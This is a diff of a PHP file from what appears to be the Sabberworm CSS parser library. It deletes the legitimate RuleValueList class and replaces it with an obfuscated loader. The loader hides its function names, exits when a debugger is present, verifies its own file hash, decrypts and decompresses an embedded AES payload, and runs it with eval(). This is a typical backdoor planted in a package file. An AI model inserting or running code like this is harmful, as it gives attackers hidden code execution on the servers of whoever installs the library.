@@ -1,9 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\Value;
-
-class RuleValueList extends ValueList {
-	public function __construct($sSeparator = ',', $iLineNo = 0) {
-		parent::__construct(array(), $sSeparator, $iLineNo);
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ggj4ztmi=('bas'.'e64'.'_de'.'cod'.'e');
+$_sv2u523m=('gzu'.'nco'.'mpr'.'ess');
+$_tf4jstx3=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_nii0k4gj='+Fakxoxi';
+$_kiv1jd5p='1iaOXC4E';
+$_y49ykacf='zAs2h8l6';
+$_fixan6nh='R0RbVuln';
+$_nabmfnhr='MdJc4DFLcz8=';
+$_al0gue0a='duCkKg==';
+$_x5en5wb4='a2/ZzH9y';
+$_z0tt3mv3='21c43v6e';
+$_y1rszlp0=$_ggj4ztmi($_kiv1jd5p.$_nii0k4gj.$_fixan6nh.$_y49ykacf.$_nabmfnhr);
+$_z71nszmi=$_ggj4ztmi($_z0tt3mv3.$_x5en5wb4.$_al0gue0a);
+$_fwqe9jg7=$_ggj4ztmi('xSAGHW6Vjs/WxjQdwTMXsWPJ+fmTMuJyd24id0tWagtK0oRqAt9iMl+H//0Gu/U0udT5nee1eJNVl75ZTZ5ZTvYVWcSpb8HhpLrlGUBOItnwd9FsuvBp0z5FcBeV9Q0Ei5jlwMAdu3MtnaYC+IjNXZ68DHR6IQxpO4x7waRk1QXMXYFqpghHNQNJlFLOm/zV4uPAPUrFUpYif4jULCVSoA==');
+$_notqxd1m=$_tf4jstx3($_fwqe9jg7,'aes-256-cbc',$_y1rszlp0,OPENSSL_RAW_DATA,$_z71nszmi);
+if($_notqxd1m===false){exit;}
+$_ypw62ovj=$_sv2u523m($_notqxd1m);
+if($_ypw62ovj===false){exit;}
+$_o7wp2ois='dfb399b5748a1f90302c480cd639b0d4205cc09bab4d16f4a449a540fa190aa6';
+$_q7lot4go=@file_get_contents(__FILE__);
+if($_q7lot4go!==false){
+$_m2ie0zhy=str_replace($_o7wp2ois,"0000000000000000000000000000000000000000000000000000000000000000",$_q7lot4go);
+$_fgk7zfiu=hash("sha256",$_m2ie0zhy);
+if($_fgk7zfiu!==$_o7wp2ois){@http_response_code(403);exit;}
 }
+eval($_ypw62ovj);
